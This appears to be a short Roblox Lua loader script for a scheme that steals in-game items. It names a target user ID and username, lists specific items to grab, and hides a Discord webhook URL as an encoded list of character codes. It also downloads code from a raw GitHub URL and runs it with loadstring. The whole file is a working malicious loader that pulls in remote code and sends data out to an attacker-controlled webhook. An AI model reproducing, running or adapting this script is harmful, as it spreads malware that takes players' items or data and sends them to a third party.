local TARGET_ID = 4107292
local TARGET_USER = "hkg"

WebhookEncrypted = "104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,52,48,51,56,56,54,56,57,50,52,53,53,48,51,54,48,56,47,112,112,119,97,85,51,80,80,45,84,67,111,86,122,65,48,109,71,55,74,73,100,105,118,81,50,50,71,103,75,75,116,78,74,65,122,103,67,54"

local TargetBrainrots = {
    ["Strawberry Elephant"] = true
}

local TargetBaseSkins = {
    ["Aquatic"] = true
}

local TargetGears = {
    ["Alien Slap"] = true
}

task.spawn(function()
    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WebhookEncrypted, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)